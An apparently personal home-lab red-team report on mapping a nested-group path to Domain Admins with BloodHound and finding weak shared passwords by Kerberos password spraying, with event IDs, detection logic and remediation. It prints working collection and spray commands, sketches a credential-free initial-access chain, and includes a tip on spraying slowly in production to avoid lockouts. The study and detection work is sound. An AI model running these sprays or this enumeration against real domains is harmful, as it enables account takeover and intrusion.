# INCIDENT REPORT #4

## Alert summary
During authorized red-team testing in my isolated home lab, two related
weaknesses in the `lab.local` Active Directory domain were identified and
exploited: a **dangerous nested group membership** that created a privilege-
escalation path to Domain Admins, and a **weak, reused password** that was
discovered through password spraying. Using BloodHound, an attack path was mapped
from an ordinary user to Domain Admins; using a password spray, two accounts were
found to share the weak password `Sommar2026!`.

- **Attack type:** Discovery (AD attack-path mapping) → Credential Access
  (password spraying)
- **Affected objects:** group `IT-Support` (nested in `Domain Admins`); accounts
  `johan` and `lisa` (weak password)
- **Privilege required:** Any valid domain user
- **MITRE ATT&CK techniques:** T1087.002, T1069.002, T1110.003, T1078.002

## Lab environment
| Role | Host | IP | OS |
|---|---|---|---|
| Domain controller | DC01.lab.local | 192.168.56.10 | Windows Server 2022 (Eval) |
| Domain client | DESKTOP-S3QQCUD | 192.168.56.11 | Windows 11 Enterprise (Eval) |
| Attacker | kali | 192.168.56.12 | Kali Linux |

- **Domain:** `lab.local`, single forest, built with `Install-ADDSForest`.
- **Network:** VirtualBox host-only, isolated (no internet).
- **Seeded weaknesses** (from [`build-lab-ad.ps1`](./build-lab-ad.ps1)):
  - The group `IT-Support` was made a member of `Domain Admins`, and ordinary
    users (`erik`, `sara`) were placed in `IT-Support` — so a normal user
    inherits Domain Admin rights through nesting.
  - Accounts `johan` and `lisa` were given the weak password `Sommar2026!`,
    while other users have a different password.
- **Starting foothold:** credentials of one ordinary user, `anna` / `Host2027!x`.

## Initial access: how a real attacker reaches this point
This lab starts from a known low-privileged account (`anna`) for convenience. A
real attacker does **not** start with valid credentials, so it is worth being
explicit about how that first foothold is actually obtained — the first account
is always **guessed, captured, or stolen**, never given.

An important distinction between the techniques in these reports:
- **Password spraying needs no known password at all** — that is the whole point.
  It requires only a list of valid **usernames** and a guess at common passwords.
  This is how an attacker obtains the *first* account (`johan`/`lisa` in this
  lab).
- **BloodHound and Kerberoasting require one valid account** — but only one, with
  no special rights. Once spraying yields a single login, the attacker pivots to
  these techniques.

A realistic end-to-end chain therefore looks like:
1. **Enumerate usernames without credentials.** Kerberos reveals whether a
   username exists (AS-REQ), so a username list can be built with no login (e.g.
   `kerbrute userenum`), supplemented by email addresses, LinkedIn, or breach
   data.
2. **Spray common passwords** against that list. In an org with hundreds of
   accounts, at least one weak password is likely; a single hit is enough.
3. **Alternative footholds that also need no known password:** network
   authentication capture, **AS-REP roasting** of accounts that do not require
   pre-authentication (crackable with only a username), or exploiting a
   vulnerable domain-joined service for code execution (e.g. the SQLi→RCE chain
   in report #2).
4. **Pivot with the first account** — run BloodHound to map paths, Kerberoast to
   reach a service account, and escalate toward Domain Admins, exactly as the
   rest of this report shows.

**Full chain:** unknown attacker → usernames → spray → first account → BloodHound
→ Kerberoasting → Domain Admins.

**Defensive relevance:** every one of these entry techniques is noisy. Username
enumeration and spraying generate many **4768/4771** events from one source
(captured in this report); AS-REP roasting shows **4768** with RC4; Responder
shows anomalous name resolution on the network. Detecting "many authentication
attempts from one source against many accounts" catches the *entry*, before the
attacker has pivoted — which is why it is one of the most valuable rules to have.

## Timeline
- Collected domain data from Kali with `bloodhound-python` as the low-privileged
  user `anna`.
- Imported the data into BloodHound CE and ran "Shortest Paths to Domain Admins".
- Found the path `erik → IT-Support → Domain Admins`; confirmed `anna` had **no**
  path (not every compromised user is dangerous).
- Ran a password spray of `Sommar2026!` across all enumerated users; `johan` and
  `lisa` authenticated successfully.

## Attack walkthrough (reproducible)

### Part A — Map attack paths with BloodHound (T1069.002)

1. Collect the data from Kali as any valid domain user:
```bash
bloodhound-python -u anna -p 'Host2027!x' -d lab.local -ns 192.168.56.10 -c All
```
This writes several `*_users.json`, `*_groups.json`, etc. files to the current
directory. (The `Failed to get Kerberos TGT, falling back to NTLM` warning is
harmless — it only means Kali could not resolve the DC's hostname and used NTLM
for LDAP instead.)

2. Package and load into BloodHound CE:
```bash
zip bloodhound.zip 2026*_*.json
```
Start BloodHound CE (`bloodhound-start`), log in to the web UI at
`http://localhost:8080`, and upload `bloodhound.zip` via **Administration →
File Ingest**.

3. In **Explore**, mark `erik` as *Owned*, then run **Path Finding** from `erik`
   to `Domain Admins` (or the built-in "Find Shortest Paths to Domain Admins").
   The path `erik → IT-Support → Domain Admins` is drawn. Running the same from
   `anna` returns **"path not found"**, confirming anna is a dead end.

### Part B — Password spraying (T1110.003)

1. Build a user list, one name per line:
```bash
printf '%s\n' anna erik sara johan lisa karl emma > users.txt
```

2. Spray one password across all users and key the result on the real success
   message, not the exit code:
```bash
pass='Sommar2026!'
rm -f *.ccache
for u in $(cat users.txt); do
  impacket-getTGT "lab.local/$u:$pass" -dc-ip 192.168.56.10 2>/dev/null \
    | grep -q "Saving ticket" && echo "[+] VALID: $u"
done
```
Expected output:
```
[+] VALID: johan
[+] VALID: lisa
```

## Operational notes (gotchas during execution)
- **Do not trust a tool's exit code.** An early version of the spray loop used
  `impacket-getTGT ... && echo VALID`, which reported **every** user as valid
  because this build of `impacket-getTGT` returns exit code 0 even on
  authentication failure. Keying the loop on the `Saving ticket` success line
  (written only on a real logon) gave the correct result (only `johan`/`lisa`).
  Lesson: verify against the actual outcome, not the return code.
- **Kerberos clock skew** affected `getTGT` the same way as in report #3; keep the
  attacker clock within 5 minutes of the DC (`nmap --script smb2-time`, then
  `date -u -s`).
- **Account lockout.** This lab domain has no lockout policy, so spraying is safe.
  In production, spray slowly and with few attempts per account to avoid locking
  users out.

## Severity
**High / Critical.** The nested-group misconfiguration means any user placed in
`IT-Support` — an everyday helpdesk group — silently holds full Domain Admin
rights. Combined with a weak, shared password discoverable by spraying, an
attacker with a single low-privileged foothold has a direct, reliable path to
complete domain takeover.

## Detection

### Audit prerequisite (important)
The spray in this report was performed over **Kerberos** (`impacket-getTGT`), so
the failures are logged as **event 4771** (Kerberos pre-authentication failed) —
**not** 4625, which is the NTLM/network-logon failure event. Critically, the
Kerberos authentication subcategory is **not audited by default** on a domain
controller: the first time this attack was run, the 4771 query returned *"No
events were found"* even though the attack had succeeded. The events only
appeared after enabling auditing and re-running the spray:
```powershell
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /get /category:"Account Logon"   # verify: Success and Failure
```
**Lesson: you cannot detect what you do not log.** Confirming that the source
event is actually audited is the first step of any detection, and a common
real-world reason attacks are missed.

### What it looks like
With auditing on and the spray re-run, the attack produced a textbook signature:
five different accounts failing within ~13 seconds, all from the same source,
each with failure code **0x18** (bad password). The two valid accounts
(`johan`, `lisa`) are **absent** from the failures because they succeeded — they
appear instead as event **4768** (TGT granted). That combination — many failures
plus a few successes from one source — is the real indicator of a successful
spray.

Actual captured events (fields trimmed, five in total):
```
Kerberos pre-authentication failed.
  Account Name:    emma      Client Address: ::ffff:192.168.56.1   Failure Code: 0x18
  Account Name:    karl      Client Address: ::ffff:192.168.56.1   Failure Code: 0x18
  Account Name:    sara      Client Address: ::ffff:192.168.56.1   Failure Code: 0x18
  Account Name:    erik      Client Address: ::ffff:192.168.56.1   Failure Code: 0x18
  Account Name:    anna      Client Address: ::ffff:192.168.56.1   Failure Code: 0x18
  (johan, lisa succeeded -> event 4768, not shown here)
```

### Detection logic
- **Password spraying:** alert when a **single source address** produces **many
  event 4771 with failure code 0x18** against **several distinct accounts** in a
  short window (optionally correlated with 4768 successes from the same source).
  For NTLM-based sprays the equivalent event is **4625**. Which event fires
  depends on the protocol the attacker used.
- **Dangerous nesting:** changes to high-value groups raise event **4728/4732**
  (member added to a security-enabled group). Privileged group membership should
  also be reviewed on a schedule, not only alerted on.

These patterns are implemented as KQL rules in the SIEM phase of this lab.

## Remediation
- **Fix the nested membership immediately:** remove `IT-Support` from
  `Domain Admins`. Privileged groups should contain only individually reviewed,
  named admin accounts — never operational groups.
- **Audit privileged group nesting** across the domain (e.g. with BloodHound run
  defensively, or `Get-ADGroupMember -Recursive`).
- **Enforce a strong password policy** and screen against common/breached
  passwords (e.g. Azure AD Password Protection / banned-password lists) to stop
  weak passwords like `Sommar2026!`.
- **Require MFA** for privileged and remote access so a single cracked/ sprayed
  password is not enough.
- **Configure account lockout / smart lockout** and alert on spray patterns
  (many 4625 from one source).

## MITRE ATT&CK
| Technique | ID | Stage |
|---|---|---|
| Account Discovery: Domain Account | T1087.002 | Enumerate users/groups via BloodHound |
| Permission Groups Discovery: Domain Groups | T1069.002 | Map nested group path to Domain Admins |
| Brute Force: Password Spraying | T1110.003 | One password against many accounts |
| Valid Accounts: Domain Accounts | T1078.002 | Access via recovered valid credentials |

## Tools used
`bloodhound-python`, BloodHound CE, `impacket-getTGT`, `nmap` (smb2-time).
